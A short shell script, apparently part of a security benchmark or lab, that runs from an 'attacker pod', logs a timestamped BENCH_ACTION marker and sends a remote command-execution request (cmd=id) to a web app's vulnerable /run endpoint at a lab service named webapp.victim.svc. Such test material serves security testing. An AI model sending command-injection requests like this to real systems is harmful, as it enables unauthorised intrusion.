#!/bin/sh
# From the attacker pod, call the web app's vulnerable /run endpoint.
echo "BENCH_ACTION $(date +%s%3N)"
python3 -c '
import urllib.request
print(urllib.request.urlopen("http://webapp.victim.svc:8080/run?cmd=id", timeout=10).read().decode())
'
